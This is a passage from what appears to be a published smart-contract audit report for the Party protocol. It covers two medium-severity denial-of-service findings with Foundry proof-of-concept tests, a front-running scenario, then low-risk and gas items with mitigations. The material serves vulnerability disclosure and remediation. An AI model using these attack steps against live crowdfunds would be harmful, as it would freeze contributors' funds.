        // `minTotalContribution` has been reached by calling `finalize()`.
        uint96 minContribution_ = minContribution;
        if (amount < minContribution_) {
            revert BelowMinimumContributionsError(amount, minContribution_);
        }
```

Let's look at an example:
(Keep in mind that the values can vary, this is just an example).
`minContribution = 2e18`<br>
`minTotalContribution = 9e18`<br>
`maxTotalContribution = 10e18`

- There is already `8.5e18` ETH contributed to the crowdfund.
- We need `0.5e18` ETH to reach `minTotalContribution` and `1.5e18` ETH to reach `maxTotalContribution`, but both of these cases are impossible since `minContribution = 2e18`.
- Alice contributes `2e18` ETH and `totalContributions = 10.5e18`, so we refund Alice `0.5e18` ETH and `amount` is now `1.5e18`.

Then we apply this check, which will always revert. We can't send less than `minContribution` and even if we send more, after we apply the refund `amount` will always be smaller than `minContribution`.

```js
    if (amount < minContribution_) {
            revert BelowMinimumContributionsError(amount, minContribution_);
    }
```

At this point the crowdfund is stuck in limbo, `minTotalContribution` and `maxTotalContribution` can never be reached. Because `minTotalContribution` isn't reached, the host can't finalize the crowdfund early. Thus, the crowdfund will eventually expire and be lost.

Users will be able to call `refund` only after the crowdfund is `Lost`. The DoS will last as long as the `duration` of the crowdfund. If `duration = 14 days`, then the users will recover their funds after 14 days.

Note that if `emergencyDisabled = true`, the DAO won't be able to retrieve their funds through `emergencyExecute` and the users will have to wait until the crowdfund is lost.

This issue can occur without anyone being malicious, although a malicious user can set up the correct state more effectively.

### Proof of Concept

Paste the following inside `test/crowdfund/InitialETHCrowdfund.t.sol` in contract `InitialETHCrowdfundTest` and run `forge test --mt test_MinTotalContributionsProblem -vvvv`:

```js
function _createCrowdfund(
        CreateCrowdfundArgs memory args,
        bool initialize
    ) internal returns (InitialETHCrowdfund crowdfund) {
        crowdfundOpts.initialContributor = args.initialContributor;
        crowdfundOpts.initialDelegate = args.initialDelegate;
        crowdfundOpts.minContribution = args.minContributions;
        crowdfundOpts.maxContribution = args.maxContributions;
        crowdfundOpts.disableContributingForExistingCard = args.disableContributingForExistingCard;
        crowdfundOpts.minTotalContributions = args.minTotalContributions;
        crowdfundOpts.maxTotalContributions = args.maxTotalContributions;
        crowdfundOpts.duration = args.duration;
        crowdfundOpts.exchangeRateBps = args.exchangeRateBps;
        crowdfundOpts.fundingSplitBps = args.fundingSplitBps;
        crowdfundOpts.fundingSplitRecipient = args.fundingSplitRecipient;
        crowdfundOpts.gateKeeper = args.gateKeeper;
        crowdfundOpts.gateKeeperId = args.gateKeeperId;

        partyOpts.name = "Test Party";
        partyOpts.symbol = "TEST";
        partyOpts.governanceOpts.partyImpl = partyImpl;
        partyOpts.governanceOpts.partyFactory = partyFactory;
        partyOpts.governanceOpts.voteDuration = 7 days;
        partyOpts.governanceOpts.executionDelay = 1 days;
        partyOpts.governanceOpts.passThresholdBps = 0.5e4;
        partyOpts.governanceOpts.hosts = new address[](1);
        partyOpts.governanceOpts.hosts[0] = address(this);
        

        crowdfund = InitialETHCrowdfund(payable(address(initialETHCrowdfundImpl).clone()));
        if (initialize) {
            crowdfund.initialize{ value: args.initialContribution }(
                crowdfundOpts,
                partyOpts,
                MetadataProvider(address(0)),
                ""
            );
        }
    }

function test_MinTotalContributionsProblem() public {
         InitialETHCrowdfund crowdfund = _createCrowdfund(
            CreateCrowdfundArgs({
                initialContribution: 0,
                initialContributor: payable(address(0)),
                initialDelegate: address(0),
                // notice the value, it's > maxTotalContributions - minTotalContributions,
                minContributions: 2 ether,
                maxContributions: type(uint96).max,
                disableContributingForExistingCard: false,
                minTotalContributions: 9 ether,
                maxTotalContributions: 10 ether, 
                duration: 7 days,
                exchangeRateBps: 1e4, 
                fundingSplitBps: 0,
                fundingSplitRecipient: payable(address(0)),
                gateKeeper: IGateKeeper(address(0)),
                gateKeeperId: bytes12(0)
            })
        );
        Party party = crowdfund.party();

        // Simulating users contributing to reach 8.5e18 ETH contributed
        address alice = _randomAddress();
        vm.deal(alice, 10_000 ether);
        vm.prank(alice);
        crowdfund.contribute{value: 8.5 ether }(address(alice), "");

        // Can't contribute anything < 2 ether
        vm.prank(alice);
        vm.expectRevert();
        crowdfund.contribute{value: 1 ether }(address(alice), "");

        
        // Can't contribute 2 ether, because 0.5 ether will be refuned which is < minContribution
        vm.prank(alice);
        vm.expectRevert();
        crowdfund.contribute{value: 2 ether}(address(alice), "");

        // At this point the crowdfund is in limbo, it can't be finalized, 
        // Host, can't finalize the crowdfund
        vm.prank(address(this));
        vm.expectRevert();
        crowdfund.finalize();
    }
```

### Tools Used

Foundry

### Recommended Mitigation Steps

Possible solution is not to allow `minContributions > maxTotalContributions - minTotalContributions`. This mitigation may not be the best long-term solution, so we suggest exploring different mitigation.

### Assessed type

DoS

**[0xble (Party) confirmed and commented via duplicate issue #453](https://github.com/code-423n4/2023-10-party-findings/issues/453#issuecomment-1813245813):**
> Would like to note this setup is not currently possible in production due to the way we allow crowdfunds to be configured for ETH raises in our UI at `party.app`. This is because either `minTotalContributions == maxTotalContributions` or `maxTotalContributions == type(uint96).max` depending on the option the Party creator selects when they choose "Allow Flexible Contributions" in our "Start a Party" page.

**[0xble (Party) commented via duplicate issue #453](https://github.com/code-423n4/2023-10-party-findings/issues/453#issuecomment-1814431344):**
> Posting this here too for reference:
>> Upon reflection, while it is similar to the issue pointed out in [the comment](https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/crowdfund/ETHCrowdfundBase.sol#L247), the finding does add nuance beyond what was acknowledged in our code comment and points out a scenario that goes beyond that mentioned. We'd like to consider it valid. It also helps that the mitigation is strong, we'd like to implement it
>
> In our comment we mention "In this scenario, users will have to wait until the crowdfund expires or a host finalizes", but in this finding's scenario, it would not be possible for a host to finalize.
>
> Another, probably more significant, factor behind us changing our minds to consider this valid and "sponsor confirmed" is that the mitigation proposed cleanly prevents the scenario from happening.
>
> Perhaps we are being too lenient here to consider it valid. I do not entirely disagree with the comment [here](https://github.com/code-423n4/2023-10-party-findings/issues/552#issuecomment-1806713047). I'll just give the reasoning behind why we chose to confirm the issue, but would like to leave it to the judge to ultimately decide, as I lack context on the standard C4 usually applies to validate finding.

**[gzeon (judge) commented via duplicate issue #453](https://github.com/code-423n4/2023-10-party-findings/issues/453#issuecomment-1817874806):**
> This is clearly out-of-scope, the fact that the proposed mitigation is good should not affect the validity of this issue for fairness.

**[J4X (warden) commented via duplicate issue #453](https://github.com/code-423n4/2023-10-party-findings/issues/453#issuecomment-1822610122):**
> @gzeon - Thanks for taking a look at the issue. I'd like to emphasize that, in my perspective, this issue should not be considered out of scope based on the following arguments.
>
> The rationale for categorizing this issue as out of scope is primarily linked to the comment in Line 247-254. However, it's crucial to note that the comment discusses a different scenario and severity. Specifically, the comment states, "In this scenario, users will have to wait until the crowdfund expires or a host finalizes after `minTotalContribution` has been reached by calling `finalize()`". It's important to highlight that the host finalizing the crowdfund is not feasible in the context showcased and validated by the POC. In this case, I've outlined that no host has the capability to prematurely close the fund and rescue user funds. This leads to a different threat than described by the comment, which incorrectly gives users the security of their funds being rescued by a host in the case of a crowdfund getting stuck.
>
> Furthermore, the comment illustrates a situation where `minTotalContributions` can still be reached by depositing, while `maxTotalContributions` cannot be achieved. This state can be described as an invariant: `minTotalContributions <= potentialDeposits < maxTotalContributions`. In this case, I've presented that neither of these thresholds can be reached. The invariant for my scenario reads as follows: `potentialDeposits < minTotalContributions <= maxTotalContributions`. Looking at those invariants one can easily determine that although using similar variables, the 2 states differ.
>
> It's crucial to note that my issue outlines a method by which a malicious user could exploit the vulnerability to freeze other users' funds or potentially lead to a loss of user funds, due to the arbitrarily selectable duration of the crowdfund. Unlike the situation described in the comment, a "permanent" loss of user funds would be possible in my case. According to the comment, the host can always close the funds after a sufficient number of deposits have been received. This is impossible in the state my issue describes, as `minTotalContributions` can never be reached, further differentiating the issues.

**[gzeon (judge) commented via duplicate issue #453](https://github.com/code-423n4/2023-10-party-findings/issues/127#issuecomment-1824548107):**
> Fair, judging as Medium due to funds are only stuck but not lost in a reasonably configured party (expire after realistic duration).

***

## [[M-07] `ETHCrowdfundBase.sol#_processContribution` - Possible DoS on finalization of crowdfund under certain conditions](https://github.com/code-423n4/2023-10-party-findings/issues/119)
*Submitted by [TresDelinquentes](https://github.com/code-423n4/2023-10-party-findings/issues/119)*

There is a check inside `_processContribution`, which checks `if (votingPower == 0)` and reverts if true.

Now let's see how we can force it to revert. If `maxTotalContributions == minTotalContributions` and `exchangeRateBps < 1e4`, we can force a rounding down to `0`, when `totalContributions = maxTotalContribtuions - 1`.

Let's take a look at an example. Note that this is allowed:

```js
        ETHCrowdfundBase.sol#_initialize
        ...
        // Set the min total contributions.
        if (opts.minTotalContributions > opts.maxTotalContributions) { // The check isn't strict enough
            revert MinGreaterThanMaxError(opts.minTotalContributions, opts.maxTotalContributions);
        }
```

`minTotalContributions = 10e18`<br>
`maxTotalContributions = 10e18`<br>
`exchangeRateBps = 0.5e4`

1. Alice contributes `5e18` to the crowdfund.
2. Bob contributes `3e18` to the crowdfund.
3. At this point, `2e18` is needed to finalize the crowdfund.
4. Alice attempts to contribute `2e18`, so the crowdfund can be finalized, but is front run by Charlie (malicious).
5. Charlie calls `contribute` with `2e18 - 1`. `totalContributions` becomes `10e18 - 1`, so `1 wei` is needed to finalize the crowdfund.
6. Alice's `contribute` gets executed. She gets refunded `2e18 - 1` (since only `1 wei` is needed for finalization) .

```js
       if (newTotalContributions >= maxTotalContributions_) {
            totalContributions = maxTotalContributions_;

            // Finalize the crowdfund.
            // This occurs before refunding excess contribution to act as a
            // reentrancy guard.
            _finalize(maxTotalContributions_);

            // Refund excess contribution.
            //       2e18 - 1             12e18 - 1            10e18
            uint96 refundAmount = newTotalContributions - maxTotalContributions;
            if (refundAmount > 0) {
            //    1      2e18 - (2e18 - 1)
                amount -= refundAmount;
                emit TestRefund(newTotalContributions, maxTotalContributions, refundAmount);
                payable(msg.sender).transferEth(refundAmount);
            }
        }
```

So `amount = 1`.

7. This line is hit:

```js
           votingPower = (amount * exchangeRateBps) / 1e4;
```

Calculating this we get: `(1 * 0.5e4) / 1e4 = 0.5` which rounds down to `0`.

8. Then we hit the next line:

```js
           if (votingPower == 0) revert ZeroVotingPowerError();
```

We will always force a revert here, no matter what original amount is sent, since we refund the excess.

9. A host attempts to call `finalize`, but it reverts because of this:

```js
            // Check that the crowdfund has reached its minimum goal.
            uint96 minTotalContributions_ = minTotalContributions;
            //       10e18 - 1              10e18
            if (totalContributions_ < minTotalContributions_) {
                revert NotEnoughContributionsError(totalContributions_, minTotalContributions_);
            }
```

Keep in mind that `minTotalContributions`, `maxTotalContributions` and `exchangeRateBps` cannot be changed after creation of the crowdfund. Users will be able to call `refund` only after the crowdfund is `Lost`.

The DoS will last as long as the `duration` of the crowdfund. If `duration = 14 days`, then the users will recover their funds after 14 days.

Note that if `emergencyDisabled = true`, the DAO won't be able to retrieve their funds through `emergencyExecute` and the users will have to wait until the crowdfund is lost.

### Proof of Concept

Paste the following inside `test/crowdfund/InitialETHCrowdfund.t.sol` in contract `InitialETHCrowdfundTest` and run `forge test --mt test_dosOnFinalizationWhenReachingTheMaxTotalContributions -vvvv`:

```js
function test_dosOnFinalizationWhenReachingTheMaxTotalContributions() public {
        InitialETHCrowdfund crowdfund = _createCrowdfund(
            CreateCrowdfundArgs({
                initialContribution: 0,
                initialContributor: payable(address(0)),
                initialDelegate: address(0),
                minContributions: 0, 
                maxContributions: type(uint96).max,
                disableContributingForExistingCard: false,
                minTotalContributions: 10e18, // note the two values
                maxTotalContributions: 10e18, 
                duration: 7 days,
                exchangeRateBps: 0.5e4, //note the exchange rate
                fundingSplitBps: 0,
                fundingSplitRecipient: payable(address(0)),
                gateKeeper: IGateKeeper(address(0)),
                gateKeeperId: bytes12(0)
            })
        );
        Party party = crowdfund.party();

        // Alice contributes
        address alice = _randomAddress();
        vm.deal(alice, 10_000e18);
        vm.prank(alice);
        crowdfund.contribute{value: 5e18}(address(alice), "");

        // Bob contributes
        address bob = _randomAddress();
        vm.deal(bob, 10_000e18);
        vm.prank(bob);
        crowdfund.contribute{value: 3e18}(address(bob), "");

        // A malicious address front runs Alice's contribution and 
        // contributes so that totalContributions = 10 ether - 1
        address malicious = _randomAddress();
        vm.deal(malicious, 10_000e18);
        vm.prank(malicious);
        crowdfund.contribute{value: 2e18 - 1 }(address(malicious), "");

        // Alice attempts to finalize the crowdfund by sending 2 ether,
        // but the tx reverts
        vm.prank(alice);
        vm.expectRevert();
        crowdfund.contribute{value: 2e18 }(address(alice), "");

        // The host can't finalize the crowdfund as well.
        vm.prank(address(this));
        vm.expectRevert();
        crowdfund.finalize();
    }
```

### Tools Used

Foundry

### Recommended Mitigation Steps

Enforce the constraint to be more strict:

```js
        // Enforce >=, instead of >
        if (opts.minTotalContributions >= opts.maxTotalContributions) { 
            revert MinGreaterThanMaxError(opts.minTotalContributions, opts.maxTotalContributions);
        }
```

### Assessed type

DoS

**[gzeon (judge) commented](https://github.com/code-423n4/2023-10-party-findings/issues/119#issuecomment-1817893274):**
 > Similar to [#552](https://github.com/code-423n4/2023-10-party-findings/issues/552) but this attack works even when `minContributions` is set to `0`. - @0xble.
> 
> It seems that to avoid both problem we need both:
> 1. `maxTotalContributions - minTotalContribution > minContribution`
> 2. `minContribution * exchangeRateBps > 1000`

**[0xble (Party) acknowledged](https://github.com/code-423n4/2023-10-party-findings/issues/119#issuecomment-1821509110)**

***

# Low Risk and Non-Critical Issues

For this audit, 22 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2023-10-party-findings/issues/344) by **3docSec** received the top score from the judge.

*The following wardens also submitted reports: [Emmanuel](https://github.com/code-423n4/2023-10-party-findings/issues/543), [TresDelinquentes](https://github.com/code-423n4/2023-10-party-findings/issues/306), [Madalad](https://github.com/code-423n4/2023-10-party-findings/issues/236), [lsaudit](https://github.com/code-423n4/2023-10-party-findings/issues/191), [0xMosh](https://github.com/code-423n4/2023-10-party-findings/issues/583), [Bauchibred](https://github.com/code-423n4/2023-10-party-findings/issues/580), [adriro](https://github.com/code-423n4/2023-10-party-findings/issues/548), [sin1st3r\_\_](https://github.com/code-423n4/2023-10-party-findings/issues/515), [joaovwfreire](https://github.com/code-423n4/2023-10-party-findings/issues/483), [J4X](https://github.com/code-423n4/2023-10-party-findings/issues/457), [0xadrii](https://github.com/code-423n4/2023-10-party-findings/issues/445), [Walter](https://github.com/code-423n4/2023-10-party-findings/issues/405), [osmanozdemir1](https://github.com/code-423n4/2023-10-party-findings/issues/394), [ZanyBonzy](https://github.com/code-423n4/2023-10-party-findings/issues/393), [Ch\_301](https://github.com/code-423n4/2023-10-party-findings/issues/386), [Shaheen](https://github.com/code-423n4/2023-10-party-findings/issues/372), [Topmark](https://github.com/code-423n4/2023-10-party-findings/issues/321), [Pechenite](https://github.com/code-423n4/2023-10-party-findings/issues/304), [0xmystery](https://github.com/code-423n4/2023-10-party-findings/issues/247), [chainsnake](https://github.com/code-423n4/2023-10-party-findings/issues/222), and [adeolu](https://github.com/code-423n4/2023-10-party-findings/issues/111).*

## [01] Several `InitialETHCrowdfund` and `ETHCrowdfundBase` functions can be called without passing by a proxy

https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/crowdfund/InitialETHCrowdfund.sol#L318<br>
https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/crowdfund/InitialETHCrowdfund.sol#L350

The `InitialETHCrowdfund` contract is meant to be used through a proxy, and many of its methods are decorated with the `onlyDelegateCall` modifier. However, several others don't, so they can be called directly.
Also, the Party contract and its parents are supposed to be used via a proxy, but they don't implement any `onlyDelegateCall` modifier.

Consider adding the `onlyDelegateCall` modifier to:
- `InitialETHCrowdfund.batchRefund`
- `ETHCrowdfundBase.finalize`
- `ETHCrowdfundBase.sendFundingSplit`
- `ETHCrowdfundBase.emergencyExecute`
- `ETHCrowdfundBase.disableEmergencyExecute`
- all external methods of `PartyGovernance` and `PartyGovernanceNFT`

Also, add an ad-hoc modifier that allows delegate calls and regular calls where `msg.sender == address(this)` to `refund` to allow multicalls.

Note that this applies to several initializers too, but this is reported separately with higher impact.

## [02] `InitialETHCrowdfund`'s initial contribution does not allow passing "gateData"

https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/crowdfund/InitialETHCrowdfund.sol#L149

At initialization time, `InitialETHCrowdfund` allows for the caller to provide an initial contribution.

Unlike other contributions, however, the initial contribution doesn't allow passing a `gateData` parameter for the gateKeeper. Initial contributions may fail for any `InitialETHCrowdfund` instance linked to a gatekeeper that requires this data to validate the contribution.

```Solidity
        uint96 initialContribution = msg.value.safeCastUint256ToUint96();
        if (initialContribution > 0) {
            // If this contract has ETH, either passed in during deployment or
            // pre-existing, credit it to the `initialContributor`.
            _contribute(
                crowdfundOpts.initialContributor,
                crowdfundOpts.initialDelegate,
                initialContribution,
                0,
                ""
            );
```

Consider adding a `gateData` field to the `InitialETHCrowdfundOptions` structure to be passed instead of an empty memory portion.

## [03] Owner-approved addresses are not allowed to contribute to existing `PartyGovernanceNFT` tokens during crowdfunding

https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/crowdfund/InitialETHCrowdfund.sol#L305

With the current implementation of `PartyGovernanceNFT`, approved addresses have extreme power over the NFTs they are approved for: they can `transfer` the approved NFTs, but also burn them from `rageQuit` without owner interaction.

They are, however, not allowed to contribute to them:

```Solidity
        // InitialETHCrowdfund.sol:305
        } else if (party.ownerOf(tokenId) == contributor) {
            // Increase voting power of contributor's existing party card.
            party.increaseVotingPower(tokenId, votingPower);
        } else {
            revert NotOwnerError(tokenId);
        }
```

Consider allowing `approved` and `approvedForAll` addresses to contribute existing NFTs.

## [04] Bps parameters are not validated to not exceed 1e4

https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/crowdfund/ETHCrowdfundBase.sol#L165<br>
https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/crowdfund/ETHCrowdfundBase.sol#L168

The protocol accepts configuration parameters in Bps (that are implicitly bound between `0 - 0%` and `10_000 - 100%`). While the lower bound is validated by the usage of an unsigned type, the higher bound is not validated. 

Values equal or above `1e4` of these two configurations are accepted and can have a large impact on the protocol, possibly beyond mere availability.

Consider adding checks for these values to not exceed a reasonable caps, most likely exclusive of `1e4` that is problematic already for zero divisions.

## [05] `OffChainSignatureValidator.isValidSignature` may revert for division by zero for not started parties

https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/signature-validators/OffChainSignatureValidator.sol#L71

Whenever an `OffChainSignatureValidator` is configured with a non-zero signing threshold for the party (`thresholdBps > 0`), but the party has not started yet (`totalVotingPower == 0`), the following calculation in `isValidSignature` may revert for division by zero:

```Solidity
        // OffChainSignatureValidator.sol:71
        if (
            thresholdBps == 0 ||
            (signerVotingPowerBps > totalVotingPower &&
                signerVotingPowerBps / totalVotingPower >= thresholdBps)
        ) {
            return IERC1271.isValidSignature.selector;
        }
```

Consider re-formulating the operation in a way that would always work:

```diff
        // OffChainSignatureValidator.sol:71
        if (
            thresholdBps == 0 ||
            (signerVotingPowerBps > totalVotingPower &&
-               signerVotingPowerBps / totalVotingPower >= thresholdBps)
+               signerVotingPowerBps >= thresholdBps * totalVotingPower)
        ) {
            return IERC1271.isValidSignature.selector;
        }
```

## [06] Contributed tokens left over from `exchangeRateBps` and `fundingSplitBps` floor rounding are not reimbursed

https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/crowdfund/InitialETHCrowdfund.sol#L302<br>
https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/crowdfund/ETHCrowdfundBase.sol#L267<br>
https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/crowdfund/ETHCrowdfundBase.sol#L270<br>
https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/crowdfund/InitialETHCrowdfund.sol#L329

When a user contributes to an `InitialETHCrowdfund`, the native tokens they send are stored and converted as shares in a `PartyGovernanceNFT`, scaled down with the `exchangeRateBps` and `fundingSplitBps` factors:

```Solidity
        // InitialETHCrowdfund:295

        votingPower = _processContribution(contributor, delegate, amount);

        // OK to contribute with zero just to update delegate.
        if (amount == 0) return 0;

        if (tokenId == 0) {
            // Mint contributor a new party card.
            party.mint(contributor, votingPower, delegate);
```

```Solidity
        // ETHCrowdfundBase:263
        
        if (fundingSplitRecipient_ != address(0) && fundingSplitBps_ > 0) {
            // Removes funding split from contribution amount in a way that
            // avoids rounding errors for very small contributions <1e4 wei.
            amount = (amount * (1e4 - fundingSplitBps_)) / 1e4;
        }

        votingPower = (amount * exchangeRateBps) / 1e4;
```

This down-scaling can incur a precision loss, up to a theoretical `999_999` per contribution, that is not sent back to the user at contribution time nor refunded after up-scaling in case the crowdfund is lost.

Consider refunding the unused tokens when the user contributes to a crowdfund. This wouldn't come at a significant cost in gas, because in the cases where users contribute round figures, an `if` would prevent a useless transfer from happening.

## [07] `OffChainSignatureValidator.isValidSignature` misses a check for `ecrecover` returning `address(0)`

https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/signature-validators/OffChainSignatureValidator.sol#L58

When `OffChainSignatureValidator` checks a given signature, it uses `ecrecover` to calculate the address that signed the input message:

```Solidity
        // OffChainSignatureValidator.sol:57

        Party party = Party(payable(msg.sender));
        address signer = ecrecover(hash, v, r, s);
        uint96 signerVotingPowerBps = party.getVotingPowerAt(signer, uint40(block.timestamp)) *
            10000;
```

When provided an invalid signature, [that is possible because `v` is not validated, `ecrecover` may return `address(0)`](https://github.com/kadenzipfel/smart-contract-vulnerabilities/blob/master/vulnerabilities/unexpected-ecrecover-null-address.md). 

While this does not represent an immediate threat, because `address(0)` cannot hold NFTs in the current Party implementation (so a separate check in `isValidSignature` would fail), in the future this missing check could be part of an attack path.

Consider implementing in-depth defense by:
- Adding a check for `v` to be either 27 or 28.
- Adding a check for `signer != address(0)`

## [08] Missing check for `ETHCrowdfundBase.exchangeRateBps` being larger than `10_000`

https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/crowdfund/ETHCrowdfundBase.sol#L166

At `ETHCrowdfundBase` initialization, the configured `exchangeRateBps` value is validated:

```Solidity
        // Set the exchange rate.
        if (opts.exchangeRateBps == 0) revert InvalidExchangeRateError(opts.exchangeRateBps);
        exchangeRateBps = opts.exchangeRateBps;
```

Being `exchangeRateBps` defined as `uint16`, it is possible that a `ETHCrowdfundBase` initialized with a value larger than `10.000` (that means 100%) despite the `ETHCrowdfundBase` assumes `10.000` as maximum value.

Consider adding an extra validation for `exchangeRateBps` being at most `10.000`.

## [09] Zero is an excessively permissive value for `OffchainSignatureValidator` default signing threshold 

https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/signature-validators/OffChainSignatureValidator.sol#L72

When called to validate a signature off-chain, `OffchainSignatureValidator` checks for a pre-configured threshold in a "party to threshold" map in storage:

```Solidity
        // OffChainSignatureValidator.sol:68

        uint96 thresholdBps = signingThersholdBps[party];

        // Either threshold is 0 or signer votes above threshold
        if (
            thresholdBps == 0 ||
            (signerVotingPowerBps > totalVotingPower &&
                signerVotingPowerBps / totalVotingPower >= thresholdBps)
        ) {
            return IERC1271.isValidSignature.selector;
        }
```

Since map values are zero by default, and a Party can change this default only through a governance action, it is possible that this logic acts more permissively than it needs to, for extended periods of time.

This seems a "permissive by default, strict by option" behavior, whereas one would rather expect it to be "strict by default, permissive by option".

Consider defaulting `thresholdBps` to a reasonably high value i.e. the Party's `passThresholdBps`; an additional magic value can be accommodated within the `uint96` range to allow the Party to opt-in for the "every token holder can sign" behavior through an `ArbitraryCallsProposal`.

## [10] `ETHCrowdfundBase._processContribution` can fail due to uint96 overflow

https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/crowdfund/ETHCrowdfundBase.sol#L270

When processing a contribution within the  `_processContribution` function, `ETHCrowdfundBase` converts the provided ETH amount into votes with this expression:

```Solidity
        // ETHCrowdfundBase:270
        
        // Calculate voting power.
        votingPower = (amount * exchangeRateBps) / 1e4;
```

Since `votingPower` is defined as `uint96` and `exchangeRateBps` can be a number up to `10000`, the multiplication can overflow the `uint96` size implicitly used for evaluating the operation.

Consider using `uint256` to accommodate values inflated by the product during the calculation:

```diff
        // ETHCrowdfundBase:270
        // Calculate voting power.
-       votingPower = (amount * exchangeRateBps) / 1e4;
+       votingPower = ((uint256(amount) * exchangeRateBps) / 1e4).safeCastUint256ToUint96();
```

## [11] `RendererBase` does not need to define a virtual `contractURI()` function

https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/renderers/RendererBase.sol#L26

The `RendererBase` abstract contract defines a `function contractURI() virtual` function. This definition is unnecessary, because `RendererBase` is an abstract child of `IERC721Renderer`, and this condition is sufficient to enforce at compile-time the presence of an implementation in its children.

Consider removing it.

## [12] Misleading comment in `InitialETHCrowdfund.initialize`

https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/crowdfund/InitialETHCrowdfund.sol#L142

The below comment in the `initialize` function explains how pre-existing balance is contributed:

```Solidity
        uint96 initialContribution = msg.value.safeCastUint256ToUint96();
        if (initialContribution > 0) {
            // If this contract has ETH, either passed in during deployment or
            // pre-existing, credit it to the `initialContributor`.
            _contribute(
                crowdfundOpts.initialContributor,
                crowdfundOpts.initialDelegate,
                initialContribution,
                0,
                ""
            );
```

This is however incorrect, because only `msg.value` is contributed and pre-existing balance is ignored. 

Consider updating the comment to reflect the contract behavior.

## [13] `InitialContributor` and `InitialDelegate` can be removed from `ETHCrowdfundOptions`

https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/crowdfund/ETHCrowdfundBase.sol#L35

The two initialization parameters `initialContributor` and `initialDelegate` that are passed when initializing `ETHCrowdfundOptions` are unused, because the initial contribution is added by the child `InitialETHCrowdfund` contract. 

Consider removing them from `ETHCrowdfundOptions` and cleaning up the code that passes them through from `InitialETHCrowdfundOptions`.

## [14] Typo in `OffChainSignatureValidator`

https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/signature-validators/OffChainSignatureValidator.sol#L22

Consider renaming the `signingThersholdBps` map to `signingThresholdBps` instead.

## [15] `PartyGovernance` and `ProposalExecutionEngine` inherit from the same parents in different order

`PartyGovernance` and `ProposalExecutionEngine` inherit both from `Implementation` and `ProposalStorage`.

However, these two parents are inherited in a different order:

```Solidity
// ProposalExecutionEngine.sol:24
contract ProposalExecutionEngine is
    IProposalExecutionEngine,
    Implementation,
    ProposalStorage,
```

```Solidity
// PartyGovernance.sol:23
abstract contract PartyGovernance is
    ProposalStorage,
    Implementation,
    IERC4906,
```

This does not currently make a difference in the contract storage because `ProposalStorage` does not use any layout-assigned storage slot. However, if the team opts in the future to have some, the change may inadvertently break the storage layout compatibility between `PartyGovernance` and `ProposalExecutionEngine` required for proper execution of `delegatecall`s.

**[0xble (Party) confirmed and commented](https://github.com/code-423n4/2023-10-party-findings/issues/344#issuecomment-1821498284):**
 > Will fix:<br>
> 02<br>
> 07<br>
> 12<br>
> 14<br>

**[gzeon (judge) commented](https://github.com/code-423n4/2023-10-party-findings/issues/344#issuecomment-1826860706):**
> 01 -> NC<br>
> 03 -> NC

**[0xble (Party) commented](https://github.com/code-423n4/2023-10-party-findings/issues/344#issuecomment-1836217440):**
 > Correction:<br>
> 02 - Does not need a fix, `gatekeeper` is always set up *after* initial contribution.

***

# Gas Optimizations

For this audit, 17 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2023-10-party-findings/issues/367) by **0xVolcano** received the top score from the judge.

*The following wardens also submitted reports: [0xAnah](https://github.com/code-423n4/2023-10-party-findings/issues/531), [DavidGiladi](https://github.com/code-423n4/2023-10-party-findings/issues/326), [tabriz](https://github.com/code-423n4/2023-10-party-findings/issues/569), [0xhex](https://github.com/code-423n4/2023-10-party-findings/issues/464), [0xta](https://github.com/code-423n4/2023-10-party-findings/issues/461), [hunter\_w3b](https://github.com/code-423n4/2023-10-party-findings/issues/430), [dharma09](https://github.com/code-423n4/2023-10-party-findings/issues/416), [arjun16](https://github.com/code-423n4/2023-10-party-findings/issues/381), [0x11singh99](https://github.com/code-423n4/2023-10-party-findings/issues/364), [pavankv](https://github.com/code-423n4/2023-10-party-findings/issues/360), [Topmark](https://github.com/code-423n4/2023-10-party-findings/issues/294), [tala7985](https://github.com/code-423n4/2023-10-party-findings/issues/285), [lsaudit](https://github.com/code-423n4/2023-10-party-findings/issues/265), [0xhacksmithh](https://github.com/code-423n4/2023-10-party-findings/issues/144), [K42](https://github.com/code-423n4/2023-10-party-findings/issues/103), and [ybansal2403](https://github.com/code-423n4/2023-10-party-findings/issues/59).*

## Pack some state variables (Note: the bot suggested truncating timestamp, but we can pack without truncating: Save 1 SLOT: 2200 Gas)

https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/party/PartyGovernance.sol#L194-L214

```solidity
    bool public emergencyExecuteDisabled;
    /// @notice Distribution fee bps.
    uint16 public feeBps;
    /// @notice Distribution fee recipient.
